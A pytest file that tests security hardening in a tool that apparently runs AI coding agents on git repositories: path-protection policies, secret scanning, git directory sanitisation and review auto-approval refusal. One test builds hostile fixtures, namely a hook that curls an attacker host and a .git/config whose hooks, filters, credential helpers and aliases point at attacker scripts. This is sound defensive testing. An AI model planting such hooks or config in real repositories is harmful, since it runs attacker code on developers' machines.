"""Production launch hardening unit tests for gitseed-runner."""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
from pathlib import Path
from typing import Any

import pytest
from gitseed_runner.adapters import (
    ClaudeCodeAdapter,
    OpenCodeAdapter,
    synthesize_stage_output_from_text,
)
from gitseed_runner.broker_modes import (
    _resolve_finalize_wait_seconds,
    run_agent_phase,
)
from gitseed_runner.git_ops import cleanup_git_locks
from gitseed_runner.gitsafe import (
    SAFE_GIT_CONFIG_ARGS,
    _exclude_internal_paths,
    apply_git_path_policy,
    build_safe_git_env,
    construct_clean_commit_and_verify_policy,
    run_safe_git,
    sanitize_git_dir,
    scan_staged_diff_for_secrets,
)
from gitseed_runner.main import (
    _SUBPROCESS_STREAM_LIMIT,
    _SUPERVISOR_LOG_LINES,
    _format_cli_stream_line,
    _get_worktree_homes_root,
    _stream_pipe,
)
from gitseed_runner.schemas import validate_stage_output_data


@pytest.fixture(autouse=True)
def _clear_supervisor_log_buffer() -> Any:
    _SUPERVISOR_LOG_LINES.clear()
    yield
    _SUPERVISOR_LOG_LINES.clear()


def _git_test(repo: Path, *args: str) -> str:
    env = os.environ.copy()
    env.update(
        {
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_AUTHOR_NAME": "Test User",
            "GIT_AUTHOR_EMAIL": "test@gitseed.local",
            "GIT_COMMITTER_NAME": "Test User",
            "GIT_COMMITTER_EMAIL": "test@gitseed.local",
        }
    )
    proc = subprocess.run(
        [
            "git",
            "-c",
            "commit.gpgsign=false",
            "-c",
            "core.autocrlf=false",
            *args,
        ],
        cwd=str(repo),
        env=env,
        capture_output=True,
        text=True,
        check=True,
    )
    return proc.stdout.strip()


def _init_repo_with_base_commit(repo: Path) -> str:
    repo.mkdir(parents=True, exist_ok=True)
    _git_test(repo, "init", "-b", "main")
    wf_dir = repo / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / "ci.yml").write_text("name: CI\non: [push]\n", encoding="utf-8")
    src_dir = repo / "src"
    src_dir.mkdir(parents=True, exist_ok=True)
    (src_dir / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    _git_test(repo, "add", "-A")
    _git_test(repo, "commit", "-m", "initial commit")
    return _git_test(repo, "rev-parse", "HEAD")


def test_apply_git_path_policy_revert_preserves_tracked_and_removes_new(
    tmp_path: Path,
) -> None:
    """Revert policy restores tracked protected files to base_sha without deleting them."""
    repo = tmp_path / "repo"
    base_sha = _init_repo_with_base_commit(repo)

    # Agent modifies tracked protected file, adds new blocked file, and edits allowed file
    ci_file = repo / ".github" / "workflows" / "ci.yml"
    new_blocked = repo / ".github" / "workflows" / "exfil.yml"
    allowed_file = repo / "src" / "app.py"

    ci_file.write_text("name: TAMPERED\n", encoding="utf-8")
    new_blocked.write_text("name: EXFIL\n", encoding="utf-8")
    allowed_file.write_text("VALUE = 2\n", encoding="utf-8")
    _git_test(repo, "add", "-A")

    res = apply_git_path_policy(
        repo,
        base_sha=base_sha,
        blocked_paths=[".github/workflows/**"],
        blocked_paths_action="revert",
    )
    assert res.ok is True
    assert res.violations == [
        ".github/workflows/ci.yml",
        ".github/workflows/exfil.yml",
    ]

    # Tracked protected file is restored to base_sha in worktree and still tracked in index
    assert ci_file.exists()
    assert ci_file.read_text(encoding="utf-8") == "name: CI\non: [push]\n"
    assert not new_blocked.exists()

    # Commit staged index and confirm ci.yml was NOT deleted while src/app.py changed
    _git_test(repo, "commit", "-m", "after revert policy")
    tracked_after = set(_git_test(repo, "ls-tree", "-r", "--name-only", "HEAD").splitlines())
    assert ".github/workflows/ci.yml" in tracked_after
    assert ".github/workflows/exfil.yml" not in tracked_after
    assert "src/app.py" in tracked_after
    diff_vs_base = _git_test(repo, "diff", "--name-only", base_sha, "HEAD").splitlines()
    assert diff_vs_base == ["src/app.py"]


def test_clean_commit_revert_policy_and_preserve_run_json(tmp_path: Path) -> None:
    """Clean-room finalize builder preserves tracked blocked files and .gitseed/run.json."""
    ws_repo = tmp_path / "workspace_repo"
    base_sha = _init_repo_with_base_commit(ws_repo)

    clean_repo = tmp_path / "clean_repo"
    _git_test(tmp_path, "clone", "--no-checkout", str(ws_repo), str(clean_repo))

    # Agent modifies ci.yml, adds new blocked file, writes .gitseed/run.json + output.json
    (ws_repo / ".github" / "workflows" / "ci.yml").write_text("tampered\n", encoding="utf-8")
    (ws_repo / ".github" / "workflows" / "evil.yml").write_text("evil\n", encoding="utf-8")
    (ws_repo / "src" / "app.py").write_text("VALUE = 42\n", encoding="utf-8")
    gitseed_dir = ws_repo / ".gitseed"
    gitseed_dir.mkdir(parents=True, exist_ok=True)
    (gitseed_dir / "run.json").write_text(
        json.dumps({"test_command": "pytest -q"}), encoding="utf-8"
    )
    (gitseed_dir / "output.json").write_text(
        json.dumps({"summary_comment": "Implemented feature"}), encoding="utf-8"
    )
    (gitseed_dir / "scratch.tmp").write_text("temporary scratch", encoding="utf-8")

    commit_res = construct_clean_commit_and_verify_policy(
        clean_repo_dir=clean_repo,
        workspace_repo_dir=ws_repo,
        base_sha=base_sha,
        seed_branch="gitseed/seed-1",
        commit_message="feat: test finalize commit",
        blocked_paths=[".github/**"],
        blocked_paths_action="revert",
    )
    assert commit_res.ok is True
    assert commit_res.has_changes is True
    assert commit_res.commit_sha is not None

    committed_files = set(
        _git_test(clean_repo, "ls-tree", "-r", "--name-only", commit_res.commit_sha).splitlines()
    )
    assert ".github/workflows/ci.yml" in committed_files
    assert ".github/workflows/evil.yml" not in committed_files
    assert ".gitseed/run.json" in committed_files
    assert ".gitseed/output.json" not in committed_files
    assert ".gitseed/scratch.tmp" not in committed_files

    ci_blob = _git_test(clean_repo, "show", f"{commit_res.commit_sha}:.github/workflows/ci.yml")
    assert ci_blob == "name: CI\non: [push]"


def test_exclude_internal_paths_preserves_run_json_strips_output_json(
    tmp_path: Path,
) -> None:
    """_exclude_internal_paths keeps .gitseed/run.json staged and strips output.json."""
    repo = tmp_path / "repo"
    base_sha = _init_repo_with_base_commit(repo)

    gs = repo / ".gitseed"
    gs.mkdir(parents=True, exist_ok=True)
    (gs / "run.json").write_text('{"test_command": "pytest"}\n', encoding="utf-8")
    (gs / "output.json").write_text('{"summary_comment": "ok"}\n', encoding="utf-8")
    (gs / "deps.sha256").write_text("deadbeef\n", encoding="utf-8")
    (gs / "notes.scratch").write_text("internal\n", encoding="utf-8")
    (repo / "opencode.json").write_text('{"apiKey": "secret"}\n', encoding="utf-8")

    _git_test(repo, "add", "-A")
    excluded = _exclude_internal_paths(repo, base_sha=base_sha)

    assert ".gitseed/output.json" in excluded
    assert ".gitseed/deps.sha256" in excluded
    assert ".gitseed/notes.scratch" in excluded
    assert "opencode.json" in excluded
    assert ".gitseed/run.json" not in excluded

    staged = set(_git_test(repo, "diff", "--cached", "--name-only", base_sha).splitlines())
    assert staged == {".gitseed/run.json"}
    assert (gs / "run.json").is_file()
    assert not (gs / "output.json").exists()
    assert not (repo / "opencode.json").exists()


def test_scan_staged_diff_for_secrets_catches_double_plus_lines(tmp_path: Path) -> None:
    """Lines inside a diff hunk starting with `++ ` (rendered as `+++ ...`) are scanned."""
    fake_openai_key = "sk-proj-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4"
    diff_payload = "\n".join(
        [
            "diff --git a/src/leak.js b/src/leak.js",
            "new file mode 100644",
            "index 0000000..1111111",
            "--- /dev/null",
            "+++ b/src/leak.js",
            "@@ -0,0 +1,3 @@",
            "+let counter = 0;",
            f'+++ counter; const SECRET = "{fake_openai_key}";',
            "+export default counter;",
        ]
    )
    findings = scan_staged_diff_for_secrets(diff_payload)
    assert len(findings) == 1
    assert findings[0]["path"] == "src/leak.js"
    assert findings[0]["line"] == 2
    assert findings[0]["rule"] == "openai_api_key"
    assert fake_openai_key not in json.dumps(findings)

    # Also verify scanning directly against a repository's staged git index
    repo = tmp_path / "secret_repo"
    base_sha = _init_repo_with_base_commit(repo)
    (repo / "src" / "app.py").write_text(
        f'++ x; TOKEN = "{fake_openai_key}"\n', encoding="utf-8"
    )
    _git_test(repo, "add", "src/app.py")
    repo_findings = scan_staged_diff_for_secrets(repo, base_sha=base_sha)
    assert len(repo_findings) == 1
    assert repo_findings[0]["path"] == "src/app.py"
    assert repo_findings[0]["rule"] == "openai_api_key"


def test_sanitize_git_dir_strips_hooks_and_malicious_config(tmp_path: Path) -> None:
    """sanitize_git_dir removes .git/hooks/* and strips executable .git/config keys."""
    repo = tmp_path / "hostile_repo"
    _init_repo_with_base_commit(repo)

    hooks_dir = repo / ".git" / "hooks"
    hooks_dir.mkdir(parents=True, exist_ok=True)
    pre_commit = hooks_dir / "pre-commit"
    pre_commit.write_text("#!/bin/sh\ncurl http://attacker.invalid/pwn\n", encoding="utf-8")
    post_checkout = hooks_dir / "post-checkout"
    post_checkout.write_text("#!/bin/sh\nid > /tmp/pwned\n", encoding="utf-8")

    malicious_cfg = "\n".join(
        [
            "[core] sshCommand = /workspace/pwn.sh",
            "\trepositoryformatversion = 0",
            "\tfilemode = true",
            "\tbare = false",
            "\taskPass = /workspace/askpass.sh",
            "\tfsmonitor = /workspace/fsmon.sh",
            "\tpager = /workspace/pager.sh",
            "\teditor = /workspace/editor.sh",
            "\thooksPath = /workspace/.evil-hooks",
            "[diff]",
            "\texternal = /workspace/diff.sh",
            "[credential]",
            "\thelper = !/workspace/cred.sh",
            "[alias]",
            "\tst = !/workspace/alias.sh",
            '[filter "evil"]',
            "\tclean = /workspace/clean.sh",
            "\tsmudge = /workspace/smudge.sh",
            "[filter.dot]",
            "\tclean = /workspace/dotclean.sh",
            "[pager]",
            "\tdiff = /workspace/pagerdiff.sh",
            "[include]",
            "\tpath = /workspace/injected.gitconfig",
            '[remote "origin"]',
            "\turl = https://github.com/org/repo.git",
            "\tfetch = +refs/heads/*:refs/remotes/origin/*",
        ]
    )
    cfg_path = repo / ".git" / "config"
    cfg_path.write_text(malicious_cfg, encoding="utf-8")

    sanitize_git_dir(repo)

    assert list(hooks_dir.iterdir()) == []
    cleaned_cfg = cfg_path.read_text(encoding="utf-8")
    for forbidden in (
        "pwn.sh",
        "askpass.sh",
        "fsmon.sh",
        "pager.sh",
        "editor.sh",
        ".evil-hooks",
        "diff.sh",
        "cred.sh",
        "alias.sh",
        "clean.sh",
        "smudge.sh",
        "dotclean.sh",
        "pagerdiff.sh",
        "injected.gitconfig",
        "[alias]",
        "[filter",
        "[pager]",
        "[credential]",
        "[include]",
    ):
        assert forbidden not in cleaned_cfg

    assert "url = https://github.com/org/repo.git" in cleaned_cfg
    assert "hooksPath = /dev/null" in cleaned_cfg
    assert "fsmonitor = false" in cleaned_cfg

    # Verify SAFE_GIT_CONFIG_ARGS and cleanup_git_locks hardening
    assert "protocol.file.allow=never" in SAFE_GIT_CONFIG_ARGS
    assert "core.hooksPath=/dev/null" in SAFE_GIT_CONFIG_ARGS
    assert "core.fsmonitor=false" in SAFE_GIT_CONFIG_ARGS

    (hooks_dir / "commit-msg").write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
    cleanup_git_locks({"org/repo": repo})
    assert list(hooks_dir.iterdir()) == []

    rc, out, _ = run_safe_git(["status", "--porcelain"], repo)
    assert rc == 0
    assert out == ""


def test_stream_pipe_handles_over_64kib_lines_and_limit_overrun() -> None:
    """_stream_pipe processes >64 KiB lines and drains LimitOverrunError without deadlocking."""
    assert _SUBPROCESS_STREAM_LIMIT == 16 * 1024 * 1024

    async def _exercise_large_line_with_16m_limit() -> list[str]:
        reader = asyncio.StreamReader(limit=_SUBPROCESS_STREAM_LIMIT)
        large_line = ("A" * (128 * 1024)) + "\n"
        reader.feed_data(large_line.encode("utf-8"))
        reader.feed_data(b"after-large-line\n")
        reader.feed_eof()
        chunks: list[str] = []
        await _stream_pipe(reader, chunks, echo_stdout=False)
        return chunks

    ok_chunks = asyncio.run(_exercise_large_line_with_16m_limit())
    assert len(ok_chunks) == 2
    assert len(ok_chunks[0]) == 128 * 1024 + 1
    assert ok_chunks[1] == "after-large-line\n"

    async def _exercise_chunked_limit_overrun() -> list[str]:
        # Simulate default 64 KiB reader receiving a 220 KiB line in streaming chunks
        small_reader = asyncio.StreamReader(limit=65536)
        chunks: list[str] = []

        async def _producer() -> None:
            for _ in range(4):
                small_reader.feed_data(b"X" * 60000)
                await asyncio.sleep(0.005)
            small_reader.feed_data(b"TAIL\nfollow-up-line\n")
            small_reader.feed_eof()

        await asyncio.gather(
            _stream_pipe(small_reader, chunks, echo_stdout=False),
            _producer(),
        )
        return chunks

    overrun_chunks = asyncio.run(_exercise_chunked_limit_overrun())
    assert any("truncated" in c for c in overrun_chunks)
    assert overrun_chunks[-1] == "follow-up-line\n"

    async def _exercise_buffered_limit_overrun() -> list[str]:
        # Pre-buffered >limit line with `\n` already in buffer before readline()
        small_reader = asyncio.StreamReader(limit=1024)
        small_reader.feed_data(b"Y" * 5000 + b"\nkept-next-line\n")
        small_reader.feed_eof()
        chunks: list[str] = []
        await _stream_pipe(small_reader, chunks, echo_stdout=False)
        return chunks

    buffered_chunks = asyncio.run(_exercise_buffered_limit_overrun())
    assert len(buffered_chunks) == 2
    assert "truncated" in buffered_chunks[0]
    assert buffered_chunks[1] == "kept-next-line\n"


def test_synthesize_stage_output_from_text_refuses_auto_approve_review() -> None:
    """synthesize_stage_output_from_text NEVER sets approved=True for review or merged=True."""
    positive_prose = "All tests pass! Code looks clean and well-structured. LGTM, ship it!"
    review_out = synthesize_stage_output_from_text("review", positive_prose)
    assert review_out is not None
    assert review_out["approved"] is False
    assert isinstance(review_out["findings"], list)
    assert len(review_out["findings"]) >= 1
    assert "blocking" in review_out["findings"][0].lower()
    assert ".gitseed/output.json" in review_out["findings"][0]

    validated_rev = validate_stage_output_data("review", review_out)
    assert validated_rev["approved"] is False

    empty_review = synthesize_stage_output_from_text("review", "LGTM")
    assert empty_review is not None
    assert empty_review["approved"] is False

    merge_out = synthesize_stage_output_from_text("merge", "Ready to merge cleanly.")
    assert merge_out is not None
    assert merge_out["merged"] is False
    validated_merge = validate_stage_output_data("merge", merge_out)
    assert validated_merge["merged"] is False


def test_opencode_adapter_cleans_up_config_and_parses_ndjson_telemetry(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """OpenCodeAdapter restores/unlinks opencode.json on exception and parses JSON telemetry."""
    ws = tmp_path / "workspace"
    ws.mkdir(parents=True, exist_ok=True)
    out_file = ws / ".gitseed" / "output.json"
    ctx: dict[str, Any] = {
        "runtime": "opencode",
        "model": "gpt-4o",
        "gateway": {
            "api_key": "sk-gitseed-ephemeral-secret",
            "base_url": "http://litellm:4000/v1",
        },
    }

    # Case 1: No pre-existing opencode.json -> unlinked even when subprocess raises
    adapter = OpenCodeAdapter(ctx=ctx, working_dir=ws, output_file=out_file)
    cmd = adapter.build_command("Implement task")
    assert cmd[:4] == ["opencode", "run", "--format", "json"]

    async def _boom_exec(*_args: Any, **_kwargs: Any) -> Any:
        assert (ws / "opencode.json").is_file()
        assert "sk-gitseed-ephemeral-secret" in (ws / "opencode.json").read_text(encoding="utf-8")
        raise TimeoutError("simulated CLI timeout")

    monkeypatch.setattr(asyncio, "create_subprocess_exec", _boom_exec)
    with pytest.raises(TimeoutError, match="simulated CLI timeout"):
        asyncio.run(adapter.run_command("Implement task", timeout=1.0))
    assert not (ws / "opencode.json").exists()

    # Case 2: Pre-existing tracked opencode.json -> exact original bytes restored on exception
    original_bytes = b'{\n  "theme": "repo-default"\n}\n'
    (ws / "opencode.json").write_bytes(original_bytes)
    adapter2 = OpenCodeAdapter(ctx=ctx, working_dir=ws, output_file=out_file)
    with pytest.raises(TimeoutError):
        asyncio.run(adapter2.run_command("Implement task", timeout=1.0))
    assert (ws / "opencode.json").read_bytes() == original_bytes

    # Case 3: Parse OpenCode NDJSON events (`step_finish`, `tokens`, `cost`, `text`) + plain text
    adapter3 = OpenCodeAdapter(ctx=ctx, working_dir=ws, output_file=out_file)
    ndjson_lines = [
        json.dumps({"type": "step_start", "part": {"type": "step-start"}}) + "\n",
        json.dumps({"type": "text", "part": {"type": "text", "text": "Inspecting files..."}})
        + "\n",
        json.dumps(
            {
                "type": "step_finish",
                "part": {
                    "type": "step-finish",
                    "cost": 0.0125,
                    "tokens": {
                        "input": 1000,
                        "output": 250,
                        "reasoning": 0,
                        "cache": {"read": 200, "write": 50},
                    },
                },
            }
        )
        + "\n",
        "plain fallback stdout line\n",
        json.dumps(
            {
                "type": "step_finish",
                "part": {
                    "type": "step-finish",
                    "cost": 0.0075,
                    "tokens": {"input": 500, "output": 150},
                },
            }
        )
        + "\n",
    ]
    rendered = "".join(_format_cli_stream_line(ln, adapter3) for ln in ndjson_lines)
    assert "Inspecting files...\n" in rendered
    assert "plain fallback stdout line\n" in rendered
    assert adapter3.input_tokens == 1750  # (1000 + 200 + 50) + 500
    assert adapter3.output_tokens == 400  # 250 + 150
    assert adapter3.peak_context_tokens == 1500
    assert adapter3.turn_count == 2
    assert adapter3.cost == pytest.approx(0.02)


def test_max_turns_broker_marker_and_ephemeral_paths(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Verify RUNNER_MAX_TURNS, .agent-done finally marker, wait timeout, and safe PATH."""
    monkeypatch.setenv("RUNNER_MAX_TURNS", "18")
    claude = ClaudeCodeAdapter(
        ctx={"runtime": "claude-code", "model": "claude-sonnet-4-5"},
        working_dir=tmp_path,
        output_file=tmp_path / "output.json",
    )
    argv = claude.build_command("Run checks")
    assert "--max-turns" in argv
    assert argv[argv.index("--max-turns") + 1] == "18"

    # Dynamic finalize wait timeout
    monkeypatch.delenv("GITSEED_FINALIZE_WAIT_SECONDS", raising=False)
    monkeypatch.setenv("RUNNER_TIMEOUT_SECONDS", "5400")
    assert _resolve_finalize_wait_seconds() == 6000.0
    monkeypatch.setenv("RUNNER_TIMEOUT_SECONDS", "1200")
    assert _resolve_finalize_wait_seconds() == 3600.0

    # run_agent_phase writes JSON .agent-done even on unexpected crash
    ctl_dir = tmp_path / "ctl"

    async def _crashing_agent() -> int:
        raise RuntimeError("unexpected crash in agent")

    with pytest.raises(RuntimeError, match="unexpected crash in agent"):
        asyncio.run(run_agent_phase(_crashing_agent, run_id="run-xyz", ctl_dir=ctl_dir))

    marker = ctl_dir / "run-xyz.agent-done"
    assert marker.is_file()
    marker_data = json.loads(marker.read_text(encoding="utf-8"))
    assert marker_data["exit_code"] == 1
    assert "completed_at" in marker_data

    # System binary paths precede non-workspace paths and strip /workspace
    monkeypatch.setenv("GITSEED_WORKSPACE", str(tmp_path / "ws"))
    monkeypatch.setenv(
        "PATH",
        os.pathsep.join(["/workspace/bin", str(tmp_path / "ws" / "bin"), "/custom/tools"]),
    )
    safe_env = build_safe_git_env()
    path_parts = safe_env["PATH"].split(os.pathsep)
    assert path_parts[:3] == ["/usr/local/bin", "/usr/bin", "/bin"]
    assert "/workspace/bin" not in path_parts

    # Worktree homes live outside /workspace
    monkeypatch.delenv("GITSEED_WORKTREE_HOMES_DIR", raising=False)
    wt_homes = _get_worktree_homes_root()
    assert ".gitseed-worktrees" not in wt_homes.as_posix()
